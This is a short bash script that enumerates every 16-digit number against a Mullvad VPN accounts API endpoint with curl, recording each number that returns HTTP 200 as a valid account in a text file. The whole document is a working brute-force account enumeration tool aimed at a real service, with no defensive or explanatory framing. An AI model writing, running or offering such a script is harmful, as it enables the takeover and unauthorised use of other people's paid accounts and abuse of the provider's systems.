#!/bin/bash

# Define API endpoint
API_URL="https://api.mullvad.net/www/accounts/v1/"

# Output file for valid accounts
VALID_ACCOUNTS="valid_accounts.txt"

# Loop through all 16-digit combinations
for ((i=1000000000000000; i<=9999999999999999; i++)); do
    # Send request to check account
    RESPONSE=$(curl -s -o /dev/null -w "%{http_code}" "$API_URL$i/")

    # Check if account is valid
    if [[ "$RESPONSE" == "200" ]]; then
        echo "Valid account: $i"
        echo "$i" >> "$VALID_ACCOUNTS"
    fi
done
